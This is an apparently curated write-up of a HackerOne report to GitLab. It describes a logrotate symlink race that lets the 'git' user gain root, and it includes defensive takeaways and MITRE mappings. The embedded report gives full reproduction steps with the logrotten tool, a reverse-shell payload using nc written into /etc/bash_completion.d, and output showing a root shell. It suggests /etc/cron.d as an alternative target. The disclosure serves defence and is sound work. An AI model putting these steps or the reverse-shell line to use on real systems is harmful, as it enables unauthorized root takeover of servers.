# Privilege Escalation via Logrotate Race Condition in GitLab Log Directory

## Metadata
- **Source:** HackerOne
- **Report:** 578119 | https://hackerone.com/reports/578119
- **Submitted:** 2019-05-12
- **Reporter:** petee
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Privilege Escalation, Race Condition, Insecure File Operations, Symlink Attack, TOCTOU (Time-of-Check-Time-of-Use)
- **CVEs:** None
- **Category:** auth-crypto

## Summary
GitLab sets log directory ownership to the 'git' system user, which enables local privilege escalation through a logrotate race condition. An attacker with git user access can replace log directories with symlinks to sensitive locations, causing logrotate running as root to write files with git ownership into arbitrary directories. This allows code execution as root when the target location is sourced (e.g., bash completion scripts, cron jobs).

## Attack scenario
1. Attacker gains access to the 'git' system user account on a GitLab server
2. Attacker monitors logrotate's scheduled execution and identifies the timing window for log rotation
3. During the race condition window, attacker replaces a log directory (e.g., /var/log/gitlab/gitlab-workhorse/) with a symlink pointing to a sensitive location (e.g., /etc/bash_completion.d/)
4. When logrotate executes as root, it follows the symlink and creates rotated log files in the target directory with git user ownership
5. Attacker injects malicious code into the newly created file that will be executed when root accesses that location (e.g., during SSH login)
6. Attacker gains root-level code execution when the condition is triggered

## Root cause
GitLab assigns write permissions on log directories to the 'git' system user, combined with logrotate's vulnerable handling of directory operations during log rotation. The race condition exists because logrotate checks directory ownership at the start of rotation but doesn't prevent symlink replacement between the check and the actual file creation. Logrotate then creates files with predictable names in the symlink target, owned by the git user.

## Attacker mindset
An attacker with local system access (git user) exploits timing vulnerabilities in privileged operations to escalate to root. They leverage the trust relationship between logrotate (running as root) and log directories (writable by git) to inject code into directories executed by root. The attack requires understanding of logrotate mechanics, race conditions, and root-accessible execution paths.

## Defensive takeaways
- Restrict write permissions on log directories - ensure only root or dedicated log users can write to directories processed by logrotate
- Use logrotate's 'create' directive with restrictive permissions instead of 'copytruncate' to avoid symlink exploitation windows
- Implement strict file ownership verification in logrotate or use SELinux/AppArmor policies to prevent symlink following in sensitive directories
- Apply the principle of least privilege - never make log directories writable by application users
- Monitor for unexpected symlinks in log directories using file integrity monitoring (FIM)
- Use secure temporary file creation mechanisms and validate directory integrity before and after privileged operations
- Segregate log directories by privilege level and avoid nested writable directories
- Keep logrotate and system utilities updated to patch known race conditions

## Variant hunting
Hunt for similar race conditions in other privileged operations that process files/directories owned by lower-privilege users: (1) backup scripts running as root that process user-writable directories, (2) package managers installing files to user-writable paths, (3) privilege escalation scripts that follow symlinks, (4) cron jobs manipulating files in shared directories, (5) systemd unit file processing with symlink-writable paths, (6) log aggregation tools with similar logrotate patterns, (7) temporary file handling in privileged contexts, (8) other GitLab components with similar permission models

## MITRE ATT&CK
- T1548.004 - Abuse Elevation Control Mechanism: Sudo/Sudo Caching
- T1547.013 - Boot or Logon Initialization Scripts: Bash Completion
- T1059.004 - Command and Scripting Interpreter: Unix Shell
- T1574.010 - Hijack Execution Flow: Symlink
- T1055 - Process Injection
- T1053 - Scheduled Task/Job

## Notes
The exploit requires specific system configuration (bare disk filesystem, no LVM/overlayfs, disabled auditd/tuned, no SELinux/AppArmor) and reliable race condition timing. The POC uses 'logrotten' tool to automate the race condition window. Alternative injection points mentioned include /etc/cron.d (no root login needed). This is a classic TOCTOU vulnerability amplified by privilege separation model. The fix requires GitLab to change log directory ownership from 'git' user to 'root' and use safer logrotate configurations.

## Full report
<details><summary>Expand</summary>

### Summary

Gitlab sets the ownership of the logdirectory to the system-user "git", which might let local users obtain root access because of unsafe interaction with logrotate.

### Steps to reproduce

Please note that the exploit is just a proof-of-concept. In order to win the race reliably the following requirements should met:

* filesystem on bare disk. don't use lvm2 or overlayfs
* don't use containers
* stop auditd
* stop tuned
* don't use selinux or apparmor


The following steps were tested with gitlab-ce and gitlab-ee on Debian Stretch(amd64):

1. ```apt-get install sudo git build-essential```
2. ```sudo -u git /bin/bash```
3. ```git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten```
4. ```cd /tmp/logrotten && gcc -o logrotten logrotten.c```
5. ```echo "hello gitlab" > /var/log/gitlab/gitlab-workhorse/something.log```
6. ```./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log```
7. ```echo "if [ \`id -u\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz```
8. ```nc -nvlp 3333```
9. A root-shell connects to port 3333 as soon as user root logins(for example via ssh)

### Impact

A privilege escalation from system-user git to system-user root is possible(local root exploit).

### Examples

The path of the logdirectory of gitlab can be manipulated by user git:
```
# logdir in gitlab-ee:
drwxr-xr-x 19 git root 4096 May 12 18:43 /var/log/gitlab/
```

Logfiles rotate once a day(or another frequency if configured) by logrotate as user root. Logrotates
configuration looks like following:
```
# logrotate-config of gitlab-ee:
/var/log/gitlab/gitlab-workhorse/*.log {
  hourly

  rotate 30
  compress
  copytruncate
  missingok
  postrotate

  endscript
}
```

Due to logrotate is prone to a race-condition it is possible for user "git" to replace the
directory /var/log/gitlab/gitlab-workhorse/ with a symbolik link to any
directory(for example /etc/bash_completion.d). Logrotate will place
files AS ROOT into /etc/bash_completition.d and set the owner of the file to "git".
An attacker could simply place a reverse-shell into this file. As soon as root logs in, a reverse
root-shell will be executed.

Details of the race-condition can be found at:

- [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
- [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)


### What is the current *bug* behavior?

Logrotate will write into any directory with root privileges and change the owner of the created file. This could lead to privilege escalation.

### What is the expected *correct* behavior?

Logrotate must not have permissions to write into any directory.

### Relevant logs and/or screenshots

#### Exploitation

Proof of concept:
```
git@Stretch64:~$ git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten
Cloning into '/tmp/logrotten'...
remote: Enumerating objects: 84, done.
remote: Counting objects: 100% (84/84), done.
remote: Compressing objects: 100% (58/58), done.
remote: Total 84 (delta 35), reused 64 (delta 24), pack-reused 0
Unpacking objects: 100% (84/84), done.
git@Stretch64:~$ cd /tmp/logrotten && gcc -o logrotten logrotten.c
git@Stretch64:/tmp/logrotten$ ./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log
Waiting for rotating /var/log/gitlab/gitlab-workhorse/something.log...
Renamed /var/log/gitlab/gitlab-workhorse with /var/log/gitlab/gitlab-workhorse2 and created symlink to /etc/bash_completion.d
Done!
git@Stretch64:/tmp/logrotten$ ls -l /etc/bash_completion.d/
total 20
-rw-r--r-- 1 root root   439 Sep 28  2018 git-prompt
-rw-r--r-- 1 root root 11144 Oct 28  2018 grub
-rw-r--r-- 1 git  git     33 May 12 18:44 something.log.1.gz
git@Stretch64:/tmp/logrotten$ echo  "if [ \`id -u\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz
git@Stretch64:/tmp/logrotten$ nc -nvlp 3333
listening on [any] 3333 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55526
id
uid=0(root) gid=0(root) groups=0(root)
ls -la
total 32
drwx------  4 root root 4096 May 12 18:47 .
drwxr-xr-x 22 root root 4096 Apr 25 18:31 ..
-rw-------  1 root root 1405 May 12 19:59 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 May 12 18:47 .config
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Apr 25 18:40 .ssh
-rw-------  1 root root 2194 May 12 17:29 .viminfo

```

Please note that for this example the exploit writes into /etc/bash_completion.d which requires that root logs in. It might be possible to exploit this bug without interaction of user root by writing into /etc/cron.d or anything similar.

### Output of checks

This bug was verified using the following installation methods:

- Omnibus gitlab-ee
- Omnibus gitlab-ce
- Manual installation using the instructions from https://docs.gitlab.com/ee/install/installation.html

#### Logrotate-configs and Logdir in gitlab-ee

/var/opt/gitlab/logrotate/logrotate.d:
```
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-pages/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-rails/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-shell//*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-workhorse/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/nginx/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/unicorn/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}

```

Permissions of the parent logdirectory:
```
drwxr-xr-x 19 git root 4096 May 12 19:58 /var/log/gitlab/
```

#### Logrotate-configs and Logdir in gitlab-ce

/var/opt/gitlab/logrotate/logrotate.d:
```
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-pages/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-rails/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-shell//*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/gitlab-workhorse/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/nginx/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
# Generated by gitlab-ctl reconfigure
# Modifications will be overwritten!

/var/log/gitlab/unicorn/*.log {
  hourly
  
  rotate 30
  compress
  copytruncate
  missingok
  postrotate
    
  endscript
}
`

</details>

---
*Analysed by Claude on 2026-05-24*
